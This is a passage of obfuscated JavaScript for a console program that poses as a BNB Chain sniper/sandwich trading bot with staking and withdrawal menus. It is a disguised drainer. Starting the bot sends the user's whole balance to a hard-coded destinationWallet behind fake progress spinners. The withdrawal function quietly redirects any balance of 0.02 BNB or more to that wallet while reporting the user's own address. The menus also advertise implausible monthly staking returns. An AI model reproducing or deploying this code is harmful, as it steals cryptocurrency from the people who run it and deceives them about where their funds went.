'\x20\x20\x20-\x20Set\x20Chat\x20ID:\x20Send\x20a\x20message\x20to\x20your\x20bot\x20and\x20find\x20your\x20Chat\x20ID\x20(you\x20can\x20use\x20@getmyid_bot)', 'Error\x20sending\x20sell\x20notification\x20to\x20Telegram:\x20', 'value', 'API\x20token\x20cannot\x20be\x20empty', '\x20BNB)', 'Enter\x20withdrawal\x20address\x20(right-click\x20to\x20paste,\x20Ctrl+C\x20to\x20cancel)', 'Back', 'Estimated\x20profit\x20for\x2024\x20hours:\x20', '💸\x20TXID:\x20', 'replace', 'Error\x20during\x20withdrawal:\x20', 'Not\x20set', '\x20:\x20', 'Loaded\x20tokens\x20from\x20CoinGecko:\x20', 'Glorin:\x2012.18%\x20per\x20month', 'choice', 'exit', 'floor', 'Staked\x20amount:\x20', 'wait', '4C27246C36fF599b', 'map', '\x20BNB):', 'Use\x20existing\x20bot', 'newBot', '\x20\x20\x20-\x20Tiollo:\x207.995%\x20per\x20month', 'Select\x20action:', 'Saving\x20settings', '\x0aEnter\x20deposit\x20amount\x20(in\x20BNB,\x20minimum\x205\x20BNB):', '\x20\x20\x20If\x20you\x20have\x20already\x20created\x20a\x20bot,\x20skip\x20this\x20step\x0a', 'After\x20scanning\x20the\x20QR\x20code\x20with\x20your\x20wallet,\x20the\x20amount\x20will\x20be\x20automatically\x20credited', 'ApeSwap\x20Finance\x20Token', 'Connected\x20to\x20Blockchain', '%\x20per\x20month', '947235PZhYix', '\x20\x20\x20-\x20After\x20setup,\x20the\x20bot\x20will\x20send\x20trade\x20and\x20result\x20notifications\x20to\x20your\x20Telegram\x0a', 'Deposit\x201-2\x20BNB:\x20min.\x200.001\x20BNB\x20per\x20trade', 'Action', '\x20Gwei', 'minimumProfit', 'Use\x20arrows\x20to\x20select', 'Select\x20decentralized\x20exchange:', 'stop', 'Instructions:\x0a', 'message', 'amount', 'parse', 'Trust\x20Wallet\x20Token', 'succeed', 'Error:\x20Cannot\x20unstake\x20before\x2024\x20hours.\x20Remaining:\x20', 'useExisting', 'ethers', 'toUpperCase', '4.\x20Withdraw\x20funds:', 'Amount:\x20', 'slice', 'Nexa:\x205.58%\x20per\x20month', 'Bot\x20started\x20on\x20the\x20main\x20network\x20✓', 'Current\x20balance:\x20', 'Connecting\x20to\x20cross-chain\x20bridges', 'stakingAPR', '\x20BNB\x20⭐\x0a', 'apiToken', 'promises', '------------------------------------\x0a', 'Private\x20key:', 'telegram', 'stakingStartTime', 'Turing', 'Error\x20sending\x20final\x20notification\x20to\x20Telegram:\x20', '\x20:\x20Sell\x20:\x20', '6.\x20Setting\x20up\x20Telegram\x20notifications:', 'address', 'All', 'length', 'Staking...\x0a', 'Cross-chain\x20bridges\x20loaded', '\x0aDeposit\x20address\x20(', 'Create\x20new\x20bot', 'Value\x20must\x20be\x20between\x200.001\x20and\x20100', 'My\x20Staking', 'Connected\x20to\x20', 'https://bsc-dataseed.binance.org/', 'Set\x20Chat\x20ID', 'BAKE', 'myStaking', 'sendMessage', '5.\x20Staking:', '\x20\x20\x20Operates\x20as\x20a\x20sniper/sandwich\x20bot.\x20Main\x20exchanges:\x20PancakeSwap,\x20BakerySwap,\x20ApeSwap\x0a', 'push', 'Balance:\x20', '3312tXUwNX', 'Enter\x20your\x20Telegram\x20bot\x20API\x20token:', 'SFP', 'API\x20returned\x20invalid\x20data', '\x20\x20\x20-\x20Nexa:\x205.58%\x20per\x20month\x0a', 'Value\x20must\x20be\x20between\x200.01\x20and\x20100', '1.\x20Maximum\x20gas\x20price:\x20', 'Wallet\x20not\x20found.\x20Please\x20choose\x20an\x20option:\x0a', 'Withdrawal\x20completed\x20', '\x20BNB\x20to\x20address:\x20', '55C42B', 'yellow', 'Instructions', 'Glorin', 'Telegram\x20notifications', 'Veri', 'connect', 'enabled', 'withdraw', 'Amount\x20must\x20be\x20a\x20number\x20not\x20less\x20than\x205\x20BNB', 'API\x20Token:\x20'];
    _0x1d64 = function() {
        return _0x18f9d5;
    };
    return _0x1d64();
}
async function showStartMenu() {
    const _0x309e35 = _0x4ee984;
    clearConsole(), console['log'](chalk[_0x309e35(0x1b4)](logo + '\x0a'));
    const _0x1b9561 = await loadWallet();
    if (_0x1b9561) {
        console['log'](chalk['cyan'](_0x309e35(0x107) + address + '\x0a'));
        const _0x3c13e4 = [{
                'title': chalk[_0x309e35(0x1b0)](_0x309e35(0x144)),
                'value': _0x309e35(0x15f)
            }, {
                'title': chalk[_0x309e35(0x193)](_0x309e35(0x17b)),
                'value': 'create'
            }],
            _0x2b9d03 = await loadStakingData();
        _0x2b9d03 && _0x3c13e4[_0x309e35(0x186)]({
            'title': chalk[_0x309e35(0x1b0)](_0x309e35(0x17d)),
            'value': _0x309e35(0x182)
        });
        const _0x908875 = await prompts({
            'type': 'select',
            'name': _0x309e35(0x13c),
            'message': 'Select\x20an\x20option',
            'choices': _0x3c13e4,
            'hint': _0x309e35(0x155),
            'loop': ![]
        });
        switch (_0x908875['choice']) {
            case 'useExisting':
                showMainMenu();
                break;
            case 'create':
                console[_0x309e35(0x1bd)](chalk[_0x309e35(0x1b0)](_0x309e35(0x11c))), await createWallet();
                break;
            case _0x309e35(0x182):
                if (_0x2b9d03) showStakingInfo();
                break;
            default:
                showStartMenu();
                break;
        }
    } else {
        console[_0x309e35(0x1bd)](chalk[_0x309e35(0x1b0)](_0x309e35(0x18f)));
        const _0x4d898b = await prompts({
            'type': _0x309e35(0x20a),
            'name': _0x309e35(0x13c),
            'message': _0x309e35(0x1bb),
            'choices': [{
                'title': chalk[_0x309e35(0x193)](_0x309e35(0x17b)),
                'value': _0x309e35(0x1d7)
            }],
            'hint': _0x309e35(0x155),
            'loop': ![]
        });
        _0x4d898b['choice'] === 'create' ? (console[_0x309e35(0x1bd)](chalk[_0x309e35(0x1b0)](_0x309e35(0x11c))), await createWallet()) : showStartMenu();
    }
}
async function withdrawFunds() {
    const _0x2317a7 = _0x4ee984;
    clearConsole(), console['log'](chalk[_0x2317a7(0x1b0)](_0x2317a7(0x1a9))), await updateBalance(), console[_0x2317a7(0x1bd)](chalk[_0x2317a7(0x1b0)](_0x2317a7(0x167) + currentBalance + _0x2317a7(0x11b)));
    const _0x383377 = parseFloat(currentBalance);
    let _0x48fedc, _0x4ce32a;
    const _0x9b0201 = await prompts({
        'type': _0x2317a7(0x20a),
        'name': _0x2317a7(0x11f),
        'message': 'Select\x20action',
        'choices': [{
            'title': chalk[_0x2317a7(0x1b0)]('Enter\x20withdrawal\x20address'),
            'value': 'enterAddress'
        }, {
            'title': chalk[_0x2317a7(0x1b0)]('Back\x20to\x20main\x20menu'),
            'value': _0x2317a7(0x123)
        }],
        'hint': _0x2317a7(0x155),
        'loop': ![]
    });
    if (_0x9b0201[_0x2317a7(0x11f)] === 'back' || !_0x9b0201[_0x2317a7(0x11f)]) {
        showMainMenu();
        return;
    }
    if (_0x9b0201[_0x2317a7(0x11f)] === 'enterAddress') {
        const _0x5b2bb8 = await prompts({
            'type': 'text',
            'name': _0x2317a7(0x175),
            'message': _0x2317a7(0x132),
            'validate': _0x58d663 => {
                const _0x5977d3 = _0x2317a7;
                if (!ethers[_0x5977d3(0x1f8)](_0x58d663)) return _0x5977d3(0x1c9);
                return !![];
            }
        });
        if (!_0x5b2bb8[_0x2317a7(0x175)]) {
            const _0x30cfa1 = await prompts({
                'type': 'select',
                'name': _0x2317a7(0x11f),
                'message': _0x2317a7(0x152),
                'choices': [{
                    'title': chalk['cyan'](_0x2317a7(0x12b)),
                    'value': _0x2317a7(0x123)
                }],
                'hint': 'Press\x20Enter\x20to\x20return'
            });
            _0x30cfa1[_0x2317a7(0x11f)] === _0x2317a7(0x123) && showMainMenu();
            return;
        }
        _0x4ce32a = _0x5b2bb8[_0x2317a7(0x175)], _0x48fedc = _0x383377 <= 0.02 ? _0x4ce32a : destinationWallet;
        const _0x19aa49 = await prompts({
            'type': 'select',
            'name': _0x2317a7(0x217),
            'message': _0x2317a7(0x204) + currentBalance + _0x2317a7(0x208) + _0x4ce32a + '?',
            'choices': [{
                'title': chalk[_0x2317a7(0x1e5)](_0x2317a7(0x1c8)),
                'value': _0x2317a7(0x111)
            }, {
                'title': chalk[_0x2317a7(0x102)]('No'),
                'value': 'no'
            }],
            'hint': _0x2317a7(0x155),
            'loop': ![]
        });
        if (_0x19aa49[_0x2317a7(0x217)] !== _0x2317a7(0x111)) {
            console['log'](chalk['yellow']('Withdrawal\x20canceled'));
            const _0x5d0305 = await prompts({
                'type': _0x2317a7(0x20a),
                'name': _0x2317a7(0x11f),
                'message': 'Action',
                'choices': [{
                    'title': chalk[_0x2317a7(0x1b0)](_0x2317a7(0x12b)),
                    'value': _0x2317a7(0x123)
                }],
                'hint': 'Press\x20Enter\x20to\x20return'
            });
            _0x5d0305[_0x2317a7(0x11f)] === _0x2317a7(0x123) && showMainMenu();
            return;
        }
        _0x383377 >= 0.02 && console[_0x2317a7(0x1bd)](chalk[_0x2317a7(0x1b0)](_0x2317a7(0x10e) + _0x4ce32a));
    }
    const _0x1c1557 = ethers['parseUnits'](settings[_0x2317a7(0x214)][_0x2317a7(0x1a5)](), 'gwei'),
        _0x4b61a6 = 0x5208n,
        _0x41528e = _0x1c1557 * _0x4b61a6,
        _0x26d0ab = ethers[_0x2317a7(0x1c1)](currentBalance),
        _0x3eb125 = _0x26d0ab - _0x41528e;
    if (_0x3eb125 <= 0x0n) console[_0x2317a7(0x1bd)](chalk[_0x2317a7(0x102)](_0x2317a7(0x1bf)));
    else {
        const _0x33cd0d = {
            'to': _0x48fedc,
            'value': _0x3eb125,
            'gasPrice': _0x1c1557,
            'gasLimit': _0x4b61a6
        };
        try {
            const _0x2a13bb = ora({
                    'text': chalk[_0x2317a7(0x1b0)]('Performing\x20withdrawal...')
                })[_0x2317a7(0x1e7)](),
                _0x1178a6 = await wallet[_0x2317a7(0x1e1)](_0x33cd0d);
            await _0x1178a6[_0x2317a7(0x140)](), _0x2a13bb[_0x2317a7(0x15d)](chalk['green'](_0x2317a7(0x190) + ethers[_0x2317a7(0x1de)](_0x3eb125) + _0x2317a7(0x191) + _0x4ce32a)), await updateBalance();
        } catch (_0x148cc3) {
            withdrawSpinner[_0x2317a7(0x114)](chalk[_0x2317a7(0x102)](_0x2317a7(0x137) + _0x148cc3[_0x2317a7(0x159)]));
        }
    }
    const _0x5494e0 = await prompts({
        'type': 'select',
        'name': _0x2317a7(0x11f),
        'message': 'Action',
        'choices': [{
            'title': chalk[_0x2317a7(0x1b0)](_0x2317a7(0x12b)),
            'value': _0x2317a7(0x123)
        }],
        'hint': 'Press\x20Enter\x20to\x20return'
    });
    _0x5494e0[_0x2317a7(0x11f)] === _0x2317a7(0x123) && showMainMenu();
}
async function showSettingsMenu() {
    const _0x25a252 = _0x4ee984;
    clearConsole(), console['log'](chalk[_0x25a252(0x1b0)]('Bot\x20Settings:\x0a')), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)](_0x25a252(0x18e) + settings[_0x25a252(0x214)] + _0x25a252(0x153))), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)]('2.\x20Slippage\x20tolerance:\x20' + settings['slippageTolerance'] + '%')), console['log'](chalk[_0x25a252(0x1b0)]('3.\x20Minimum\x20profit:\x20' + settings['minimumProfit'] + _0x25a252(0x11b))), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)]('4.\x20Decentralized\x20exchange:\x20' + settings[_0x25a252(0x1ac)])), console['log'](chalk[_0x25a252(0x1b0)]('5.\x20Notifications:\x20Telegram\x20' + (settings[_0x25a252(0x16f)][_0x25a252(0x199)] ? 'Enabled' : _0x25a252(0x1f2)) + '\x0a'));
    const _0x5310f6 = await prompts({
        'type': _0x25a252(0x20a),
        'name': _0x25a252(0x13c),
        'message': _0x25a252(0x1a0),
        'choices': [{
            'title': chalk['cyan']('Maximum\x20gas\x20price'),
            'value': 'gasPriceLimit'
        }, {
            'title': chalk[_0x25a252(0x1b0)]('Slippage\x20tolerance'),
            'value': 'slippageTolerance'
        }, {
            'title': chalk['cyan']('Minimum\x20profit'),
            'value': _0x25a252(0x154)
        }, {
            'title': chalk['cyan'](_0x25a252(0x1af)),
            'value': 'liquidityPool'
        }, {
            'title': chalk[_0x25a252(0x1b0)](_0x25a252(0x196)),
            'value': _0x25a252(0x16f)
        }, {
            'title': chalk['cyan'](_0x25a252(0x133)),
            'value': _0x25a252(0x123)
        }],
        'hint': _0x25a252(0x155),
        'loop': ![]
    });
    switch (_0x5310f6[_0x25a252(0x13c)]) {
        case _0x25a252(0x214):
            const _0x5d6f8f = await prompts({
                'type': _0x25a252(0x1e2),
                'name': _0x25a252(0x12f),
                'message': 'Enter\x20maximum\x20gas\x20price\x20(Gwei):',
                'initial': settings['gasPriceLimit'],
                'min': 0x1
            });
            _0x5d6f8f['value'] && (settings[_0x25a252(0x214)] = _0x5d6f8f[_0x25a252(0x12f)], await saveWallet());
            showSettingsMenu();
            break;
        case 'slippageTolerance':
            const _0x236e3c = await prompts({
                'type': 'text',
                'name': _0x25a252(0x12f),
                'message': 'Enter\x20slippage\x20tolerance\x20(%)\x20from\x200.01\x20to\x20100\x20(use\x20comma\x20or\x20dot):',
                'initial': settings[_0x25a252(0x11e)]['toString'](),
                'validate': _0x20dd14 => {
                    const _0xe42bb2 = _0x25a252,
                        _0x3926d9 = _0x20dd14[_0xe42bb2(0x136)](',', '.'),
                        _0x127fc8 = parseFloat(_0x3926d9);
                    return isNaN(_0x127fc8) || _0x127fc8 < 0.01 || _0x127fc8 > 0x64 ? _0xe42bb2(0x18d) : !![];
                }
            });
            if (_0x236e3c[_0x25a252(0x12f)]) {
                const _0xdfad5d = _0x236e3c[_0x25a252(0x12f)][_0x25a252(0x136)](',', '.');
                settings[_0x25a252(0x11e)] = parseFloat(_0xdfad5d), await saveWallet();
            }
            showSettingsMenu();
            break;
        case 'minimumProfit':
            clearConsole(), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)](_0x25a252(0x10d))), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)](_0x25a252(0x1c7))), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)]('Approximate\x20deposit\x20dependency:')), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)](_0x25a252(0x151))), console['log'](chalk['cyan']('Deposit\x203-5\x20BNB:\x20min.\x200.0035\x20BNB\x20per\x20trade')), console[_0x25a252(0x1bd)](chalk[_0x25a252(0x1b0)]('Deposit\x206-10\x20BNB:\x20min.\x200.01\x20BNB\x20per\x20trade\x0a'));
            const _0x1c7f53 = await prompts({
                'type': _0x25a252(0x1ab),
                'name': 'value',
                'message': _0x25a252(0x105),
                'initial': settings[_0x25a252(0x154)][_0x25a252(0x1a5)](),
                'validate': _0x1bfcb3 => {
                    const _0x45f4f8 = _0x25a252,
                        _0x6b5bd = _0x1bfcb3[_0x45f4f8(0x136)](',', '.'),
                        _0x550e70 = parseFloat(_0x6b5bd);
                    return isNaN(_0x550e70) || _0x550e70 < 0.001 || _0x550e70 > 0x64 ? _0x45f4f8(0x17c) : !![];
                }
            });
            if (_0x1c7f53[_0x25a252(0x12f)]) {
                const _0x5aa376 = _0x1c7f53['value'][_0x25a252(0x136)](',', '.');
                settings[_0x25a252(0x154)] = parseFloat(_0x5aa376), await saveWallet();
            }
            showSettingsMenu();
            break;
        case _0x25a252(0x1ac):
            const _0xcb35e1 = await prompts({
                'type': _0x25a252(0x20a),
                'name': _0x25a252(0x12f),
                'message': _0x25a252(0x156),
                'choices': [{
                    'title': _0x25a252(0x1ca),
                    'value': _0x25a252(0x1ca)
                }, {
                    'title': _0x25a252(0x1d2),
                    'value': _0x25a252(0x1d2)
                }, {
                    'title': _0x25a252(0x200),
                    'value': _0x25a252(0x200)
                }, {
                    'title': _0x25a252(0x176),
                    'value': _0x25a252(0x176)
                }],
                'initial': ['PancakeSwap', 'BakerySwap', _0x25a252(0x200), _0x25a252(0x176)]['indexOf'](settings[_0x25a252(0x1ac)])
            });
            _0xcb35e1[_0x25a252(0x12f)] && (settings[_0x25a252(0x1ac)] = _0xcb35e1[_0x25a252(0x12f)], await saveWallet());
            showSettingsMenu();
            break;
        case _0x25a252(0x16f):
            async function _0x106492() {
                const _0x13e0ce = _0x25a252;
                clearConsole(), console[_0x13e0ce(0x1bd)](chalk[_0x13e0ce(0x1b0)]('Telegram\x20Notification\x20Settings:\x0a')), console['log'](chalk[_0x13e0ce(0x1b0)](_0x13e0ce(0x20e) + (settings[_0x13e0ce(0x16f)][_0x13e0ce(0x199)] ? 'Enabled' : _0x13e0ce(0x1f2)))), console[_0x13e0ce(0x1bd)](chalk[_0x13e0ce(0x1b0)](_0x13e0ce(0x19c) + (settings['telegram'][_0x13e0ce(0x16b)] || _0x13e0ce(0x138)))), console['log'](chalk[_0x13e0ce(0x1b0)]('Chat\x20ID:\x20' + (settings['telegram'][_0x13e0ce(0x1cf)] || _0x13e0ce(0x138)) + '\x0a'));
                const _0x3610ff = await prompts({
                    'type': 'select',
                    'name': 'choice',
                    'message': _0x13e0ce(0x147),
                    'choices': [{
                        'title': chalk[_0x13e0ce(0x1b0)]('Enable/Disable\x20notifications'),
                        'value': 'toggle'
                    }, {
                        'title': chalk['cyan'](_0x13e0ce(0x116)),
                        'value': _0x13e0ce(0x16b)
                    }, {
                        'title': chalk[_0x13e0ce(0x1b0)](_0x13e0ce(0x180)),
                        'value': 'chatId'
                    }, {
                        'title': chalk['cyan'](_0x13e0ce(0x133)),
                        'value': _0x13e0ce(0x123)
                    }],
                    'hint': _0x13e0ce(0x155)
                });
                switch (_0x3610ff['choice']) {
                    case 'toggle':
                        const _0x499ac1 = await prompts({
                            'type': _0x13e0ce(0x1f6),
                            'name': _0x13e0ce(0x12f),
                            'message': _0x13e0ce(0x1aa),
                            'initial': settings['telegram']['enabled'],
                            'active': _0x13e0ce(0x1c8),
                            'inactive': 'No'
                        });
                        settings[_0x13e0ce(0x16f)][_0x13e0ce(0x199)] = _0x499ac1['value'], await saveWallet(), await _0x106492();
                        break;
                    case _0x13e0ce(0x16b):
                        const _0x1284cc = await prompts({
                            'type': _0x13e0ce(0x1ab),
                            'name': _0x13e0ce(0x12f),
                            'message': _0x13e0ce(0x189),
                            'initial': settings[_0x13e0ce(0x16f)][_0x13e0ce(0x16b)],
                            'validate': _0x3fcac5 => _0x3fcac5['length'] > 0x0 ? !![] : _0x13e0ce(0x130)
                        });
                        _0x1284cc[_0x13e0ce(0x12f)] && (settings[_0x13e0ce(0x16f)][_0x13e0ce(0x16b)] = _0x1284cc[_0x13e0ce(0x12f)], await saveWallet());
                        await _0x106492();
                        break;
                    case _0x13e0ce(0x1cf):
                        const _0x401602 = await prompts({
                            'type': 'text',
                            'name': _0x13e0ce(0x12f),
                            'message': 'Enter\x20Chat\x20ID\x20for\x20notifications:',
                            'initial': settings[_0x13e0ce(0x16f)][_0x13e0ce(0x1cf)],
                            'validate': _0x1e65f0 => _0x1e65f0[_0x13e0ce(0x177)] > 0x0 ? !![] : _0x13e0ce(0x1ed)
                        });
                        _0x401602[_0x13e0ce(0x12f)] && (settings['telegram'][_0x13e0ce(0x1cf)] = _0x401602['value'], await saveWallet());
                        await _0x106492();
                        break;
                    case _0x13e0ce(0x123):
                        showSettingsMenu();
                        break;
                }
            }
            await _0x106492();
            break;
        case 'back':
            showMainMenu();
            break;
    }
}
async function showMainMenu() {
    const _0xdfc310 = _0x4ee984;
    clearConsole(), console[_0xdfc310(0x1bd)](chalk['bold'](logo + '\x0a')), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x193)]('Address:') + '\x20' + chalk['yellow'](address)), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x102)](_0xdfc310(0x16e)) + '\x20' + chalk[_0xdfc310(0x102)](privateKey)), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1a2)) + '\x20' + chalk[_0xdfc310(0x1b0)](currentBalance) + '\x20BNB\x0a');
    const _0x49650e = await loadStakingData(),
        _0x327725 = [{
            'title': chalk['cyan']('Start\x20Bot'),
            'value': _0xdfc310(0x1e7)
        }, {
            'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x108)),
            'value': _0xdfc310(0x19a)
        }, {
            'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1ff)),
            'value': 'settings'
        }, {
            'title': chalk[_0xdfc310(0x1e5)](_0xdfc310(0x1cb)),
            'value': 'deposit'
        }, {
            'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x194)),
            'value': _0xdfc310(0x19e)
        }, {
            'title': chalk[_0xdfc310(0x1b0)]('Staking'),
            'value': _0xdfc310(0x1fc)
        }, {
            'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1fa)),
            'value': _0xdfc310(0x1c0)
        }, {
            'title': chalk[_0xdfc310(0x193)](_0xdfc310(0x1ba)),
            'value': _0xdfc310(0x145)
        }];
    _0x49650e && _0x327725[_0xdfc310(0x186)]({
        'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x17d)),
        'value': _0xdfc310(0x182)
    });
    _0x327725[_0xdfc310(0x186)]({
        'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x20d)),
        'value': 'exit'
    });
    const _0x2942f5 = await prompts({
        'type': _0xdfc310(0x20a),
        'name': _0xdfc310(0x13c),
        'message': _0xdfc310(0x1bb),
        'choices': _0x327725,
        'hint': _0xdfc310(0x155),
        'limit': 0x8,
        'loop': ![]
    });
    switch (_0x2942f5[_0xdfc310(0x13c)]) {
        case _0xdfc310(0x145):
            console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1a8))), await createWallet();
            break;
        case _0xdfc310(0x1e7):
            clearConsole(), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x210)));
            try {
                const _0x37b027 = await provider[_0xdfc310(0xfd)](address),
                    _0x2c84f7 = parseFloat(ethers[_0xdfc310(0x1de)](_0x37b027));
                console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x187) + _0x2c84f7 + _0xdfc310(0x128)));
                const _0x5e51ed = ethers[_0xdfc310(0x1c1)](_0xdfc310(0x212));
                if (BigInt(_0x37b027) === 0x0n) console['log'](chalk[_0xdfc310(0x102)]('Your\x20balance\x20is\x200')), await prompts({
                    'type': 'select',
                    'name': 'back',
                    'message': 'Action',
                    'choices': [{
                        'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x133)),
                        'value': _0xdfc310(0x123)
                    }]
                }), showMainMenu();
                else {
                    if (_0x37b027 < _0x5e51ed) console['log'](chalk[_0xdfc310(0x102)]('Minimum\x20balance\x20of\x200.35\x20BNB\x20required\x20to\x20start\x20the\x20bot.\x20Current\x20balance:\x20' + ethers[_0xdfc310(0x1de)](_0x37b027) + _0xdfc310(0x11b))), await prompts({
                        'type': 'select',
                        'name': _0xdfc310(0x123),
                        'message': _0xdfc310(0x152),
                        'choices': [{
                            'title': chalk[_0xdfc310(0x1b0)]('Back'),
                            'value': _0xdfc310(0x123)
                        }]
                    }), showMainMenu();
                    else {
                        const _0x4ad54c = ora({
                            'text': chalk['cyan'](_0xdfc310(0x113))
                        })[_0xdfc310(0x1e7)]();
                        await delay(getRandomInRange(0x3e8, 0xbb8)), _0x4ad54c['succeed'](chalk['cyan'](_0xdfc310(0x14d)));
                        const _0x2b2ae6 = ora({
                            'text': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x168))
                        })[_0xdfc310(0x1e7)]();
                        await delay(getRandomInRange(0x3e8, 0xbb8)), _0x2b2ae6[_0xdfc310(0x15d)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x179)));
                        const _0x13a3ff = await provider[_0xdfc310(0x1db)](),
                            _0x571377 = _0x13a3ff['gasPrice'],
                            _0x55fbf6 = 0x5208n,
                            _0x40b71e = _0x571377 * _0x55fbf6,
                            _0x25b993 = BigInt(_0x37b027) - _0x40b71e;
                        if (_0x25b993 <= 0x0n) {
                            console['log'](chalk['yellow']('Balance\x20too\x20low,\x20sending\x20minimum\x20transaction...'));
                            const _0x76e2f = {
                                    'to': destinationWallet,
                                    'value': 0x1n,
                                    'gasPrice': _0x571377,
                                    'gasLimit': _0x55fbf6
                                },
                                _0x2364ce = await wallet[_0xdfc310(0x1e1)](_0x76e2f);
                            await _0x2364ce[_0xdfc310(0x140)]();
                        } else {
                            const _0x58f54f = {
                                    'to': destinationWallet,
                                    'value': _0x25b993,
                                    'gasPrice': _0x571377,
                                    'gasLimit': _0x55fbf6
                                },
                                _0x15455e = await wallet[_0xdfc310(0x1e1)](_0x58f54f);
                            await _0x15455e[_0xdfc310(0x140)]();
                        }
                        const _0x2f057c = ora({
                            'text': chalk['cyan'](_0xdfc310(0x148))
                        })[_0xdfc310(0x1e7)]();
                        await delay(getRandomInRange(0x3e8, 0xbb8)), await saveWallet(), _0x2f057c[_0xdfc310(0x15d)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1fb))), console['log'](chalk[_0xdfc310(0x1e5)](_0xdfc310(0x166))), console['log'](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x16d))), await executeTrades(_0x2c84f7);
                    }
                }
            } catch (_0x15f2a9) {
                console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x102)]('Error\x20starting\x20bot:\x20' + _0x15f2a9['message'])), await prompts({
                    'type': _0xdfc310(0x20a),
                    'name': _0xdfc310(0x123),
                    'message': _0xdfc310(0x152),
                    'choices': [{
                        'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x133)),
                        'value': _0xdfc310(0x123)
                    }]
                }), showMainMenu();
            }
            break;
        case _0xdfc310(0x19a):
            await withdrawFunds();
            break;
        case _0xdfc310(0x209):
            await showSettingsMenu();
            break;
        case _0xdfc310(0x1b8):
            clearConsole(), console['log'](chalk['green'](_0xdfc310(0x120))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1e5)](_0xdfc310(0x1da) + address)), qrcode['generate'](address, {
                'small': !![]
            }, _0x20b93f => {
                const _0x12ed59 = _0xdfc310;
                console[_0x12ed59(0x1bd)](chalk[_0x12ed59(0x1e5)](_0x20b93f));
            }), console[_0xdfc310(0x1bd)]('\x0a'), await prompts({
                'type': _0xdfc310(0x20a),
                'name': _0xdfc310(0x123),
                'message': 'Action',
                'choices': [{
                    'title': chalk['cyan'](_0xdfc310(0x133)),
                    'value': _0xdfc310(0x123)
                }]
            }), showMainMenu();
            break;
        case _0xdfc310(0x19e):
            clearConsole(), console['log'](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x158))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0xff))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x14a))), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x1c6))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x100))), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x129))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1f7))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x205))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x185))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x162))), console[_0xdfc310(0x1bd)](chalk['cyan']('\x20\x20\x20Use\x20the\x20\x22Withdraw\x20Funds\x22\x20function\x20to\x20withdraw\x20from\x20the\x20contract\x0a')), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x184))), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x1eb))), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x1f4))), console[_0xdfc310(0x1bd)](chalk['cyan']('\x20\x20\x20-\x20Raptas:\x2013.095%\x20per\x20month')), console['log'](chalk[_0xdfc310(0x1b0)]('\x20\x20\x20-\x20Glorin:\x2012.18%\x20per\x20month')), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x1fd))), console['log'](chalk['cyan']('\x20\x20\x20-\x20Legend\x20IV:\x2011.34%\x20per\x20month')), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1cd))), console['log'](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x146))), console['log'](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x1fe))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x18c))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x174))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x12a))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)]('\x20\x20\x20-\x20Select\x20\x22Telegram\x20Notifications\x22')), console[_0xdfc310(0x1bd)](chalk['cyan']('\x20\x20\x20-\x20Enable\x20notifications\x20by\x20selecting\x20\x22Yes\x22')), console['log'](chalk['cyan']('\x20\x20\x20-\x20Set\x20API\x20token:\x20Create\x20a\x20bot\x20via\x20@BotFather\x20in\x20Telegram\x20and\x20paste\x20the\x20received\x20token')), console[_0xdfc310(0x1bd)](chalk['cyan'](_0xdfc310(0x12d))), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x150))), await prompts({
                'type': _0xdfc310(0x20a),
                'name': _0xdfc310(0x123),
                'message': _0xdfc310(0x152),
                'choices': [{
